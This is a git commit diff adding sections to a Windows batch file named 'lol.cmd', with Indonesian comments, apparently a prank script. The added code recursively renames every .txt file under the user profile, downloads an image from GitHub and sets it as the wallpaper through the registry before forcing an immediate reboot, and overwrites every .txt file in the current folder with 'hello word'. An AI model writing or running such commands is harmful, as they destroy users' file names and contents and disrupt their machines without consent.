89dbe18b0b975bee0dc920405da75bd7e193ada8
Nathanael Praditya <leerlryzck9@gmail.com>
2026-05-15 18:57:46 +0700

    Update lol.cmd

--- lol.cmd
+++ lol.cmd
@@ -1,3 +1,5 @@
+### rename *.txt menjadi ALLUSER ###
+
 @echo off
 setlocal enabledelayedexpansion
 
@@ -6,6 +8,31 @@ set count=1
 for /r "%USERPROFILE%" %%f in (*.txt) do (
     ren "%%f" "ALLUSER_!count!.txt"
     set /a count+=1
+)
+
+pause
+
+============================================
+
+### Download gambar - reboot - set wallpaper ###
+
+@echo off
+
+curl -L -s "https://raw.githubusercontent.com/Axenide/Wallpapers/main/city-street.jpg" -o "%USERPROFILE%\Downloads\me.jpg"
+
+set img=%USERPROFILE%\Downloads\me.jpg
+
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f >nul 2>&1
+
+shutdown /r /t 0
+
+============================================
+### ubah isi *.txt - hello word
+
+@echo off
+
+for %%f in (*.txt) do (
+    echo hello word > "%%f"
 )
 
 pause
